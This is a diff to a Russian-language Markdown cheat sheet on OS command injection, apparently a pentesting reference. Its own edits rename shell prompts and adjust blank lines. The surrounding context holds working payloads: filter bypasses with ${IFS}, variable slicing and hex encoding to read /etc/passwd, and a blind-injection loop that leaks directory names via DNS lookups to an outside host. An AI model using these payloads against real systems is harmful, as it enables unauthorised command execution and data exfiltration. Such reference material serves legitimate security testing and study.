@@ -88,7 +88,7 @@ ls${LS_COLORS:10:1}${IFS}id
 Новая строка (0x0a или \n)
 ```
 > Иногда входные данные появляются в кавычках в исходной команде. В этой ситуации необходимо завершить цитируемый контекст (используя " или ') перед использованием подходящих метасимволов оболочки для внедрения новой команды.
->
+
 > $IFS — это специальная переменная оболочки, называемая внутренним разделителем полей.
 
 # **Уязвимости слепого внедрения команд ОС**
@@ -108,6 +108,7 @@ for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 ```
 # **Argument Injection**
 * Выполнение команды, когда возможно только добавлять аргументы к существующей команде.
+
 [Вектор](https://sonarsource.github.io/argument-injection-vectors/#+file%20write)
   
 # **Защита**
@@ -148,7 +149,7 @@ echo ~-
 ```
 ### Выполнение команд без /
 ```
-swissky@crashlab:~$ echo ${HOME:0:1}
+kali@crashlab:~$ echo ${HOME:0:1}
 /
 
 kaliy@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
@@ -165,28 +166,28 @@ root:x:0:0:root:/root:/bin/bash
 ```
 ### HEX 
 ```
-swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+kali@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 /etc/passwd
 
-swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+kali@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
+kali@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+kali@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
+kali@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
 /etc/passwd
 
-swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
+kali@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
+kali@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
 /etc/passwd
 
-swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+kali@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
 ```
 ### С помощью кавычек
